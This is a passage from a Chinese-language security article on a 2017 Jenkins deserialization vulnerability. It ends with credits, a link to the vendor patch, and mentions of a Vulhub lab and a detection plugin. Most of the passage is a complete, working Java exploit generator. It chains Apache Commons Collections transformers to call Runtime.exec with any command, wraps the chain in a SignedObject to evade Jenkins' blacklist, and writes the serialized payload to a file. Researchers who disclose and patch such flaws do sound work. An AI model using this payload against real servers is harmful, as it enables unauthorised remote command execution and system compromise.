    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections.map.ReferenceMap;
    import org.apache.commons.collections.set.ListOrderedSet;
    public class Payload implements Serializable {
        private Serializable payload;
        public Payload(String cmd) throws Exception {
            this.payload = this.setup(cmd);
        }
        public Serializable setup(String cmd) throws Exception {
            final String[] execArgs = new String[] { cmd };
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] { String.class,
                            Class[].class }, new Object[] { "getRuntime",
                            new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] { Object.class,
                            Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class },
                            execArgs), new ConstantTransformer(1) };
            Transformer transformerChain = new ChainedTransformer(transformers);
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException e) {
                f = HashSet.class.getDeclaredField("backingMap");
            }
            f.setAccessible(true);
            HashMap innimpl = (HashMap) f.get(map);
            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException e) {
                f2 = HashMap.class.getDeclaredField("elementData");
            }
            f2.setAccessible(true);
            Object[] array2 = (Object[]) f2.get(innimpl);
            Object node = array2[0];
            if (node == null) {
                node = array2[1];
            }
            Field keyField = null;
            try {
                keyField = node.getClass().getDeclaredField("key");
            } catch (Exception e) {
                keyField = Class.forName("java.util.MapEntry").getDeclaredField(
                        "key");
            }
            keyField.setAccessible(true);
            keyField.set(node, entry);
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
            keyPairGenerator.initialize(1024);
            KeyPair keyPair = keyPairGenerator.genKeyPair();
            PrivateKey privateKey = keyPair.getPrivate();
            PublicKey publicKey = keyPair.getPublic();
            Signature signature = Signature.getInstance(privateKey.getAlgorithm());
            SignedObject payload = new SignedObject(map, privateKey, signature);
            JSONArray array = new JSONArray();
            array.add("asdf");
            ListOrderedSet set = new ListOrderedSet();
            Field f1 = AbstractCollectionDecorator.class
                    .getDeclaredField("collection");
            f1.setAccessible(true);
            f1.set(set, array);
            DummyComperator comp = new DummyComperator();
            ConcurrentSkipListSet csls = new ConcurrentSkipListSet(comp);
            csls.add(payload);
            CopyOnWriteArraySet a1 = new CopyOnWriteArraySet();
            CopyOnWriteArraySet a2 = new CopyOnWriteArraySet();
            a1.add(set);
            Container c = new Container(csls);
            a1.add(c);
            a2.add(csls);
            a2.add(set);
            ReferenceMap flat3map = new ReferenceMap();
            flat3map.put(new Container(a1), "asdf");
            flat3map.put(new Container(a2), "asdf");
            return flat3map;
        }
        private Object writeReplace() throws ObjectStreamException {
            return this.payload;
        }
        static class Container implements Serializable {
            private Object o;
            public Container(Object o) {
                this.o = o;
            }
            private Object writeReplace() throws ObjectStreamException {
                return o;
            }
        }
        static class DummyComperator implements Comparator, Serializable {
            public int compare(Object arg0, Object arg1) {
                // TODO Auto-generated method stub
                return 0;
            }
            private Object writeReplace() throws ObjectStreamException {
                return null;
            }
        }
        public static void main(String args[]) throws Exception{
            if(args.length != 2){
                System.out.println("java -jar payload.jar outfile cmd");
                System.exit(0);
            }
            String cmd = args[1];
            FileOutputStream out = new FileOutputStream(args[0]);
            Payload pwn = new Payload(cmd);
            ObjectOutputStream oos = new ObjectOutputStream(out);
            oos.writeObject(pwn);
            oos.flush();
            out.flush();
        }
    }
**四、其他说明**
感谢某位独立安全研究员向SecuriTeam安全公告计划提交此漏洞。
CloudBees
Jenkins已经发布了安全补丁修复这个漏洞，读者可以参考[此处](https://jenkins.io/security/advisory/2017-04-26)获取更多细节。
**五、漏洞环境及检测脚本**
****
**感谢开源社区力量**  
漏洞靶场环境 由 **phithon** 维护
Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。
漏洞检测插件 由YSRC社区成员 **Dee-Ng** 提供
该漏洞检测插件需要基于巡风系统使用，巡风是一款适用于企业内网的漏洞快速应急、巡航扫描系统，通过搜索功能可清晰的了解内部网络资产分布情况，并且可指定漏洞插件对搜索结果进行快速漏洞检测并输出结果报表。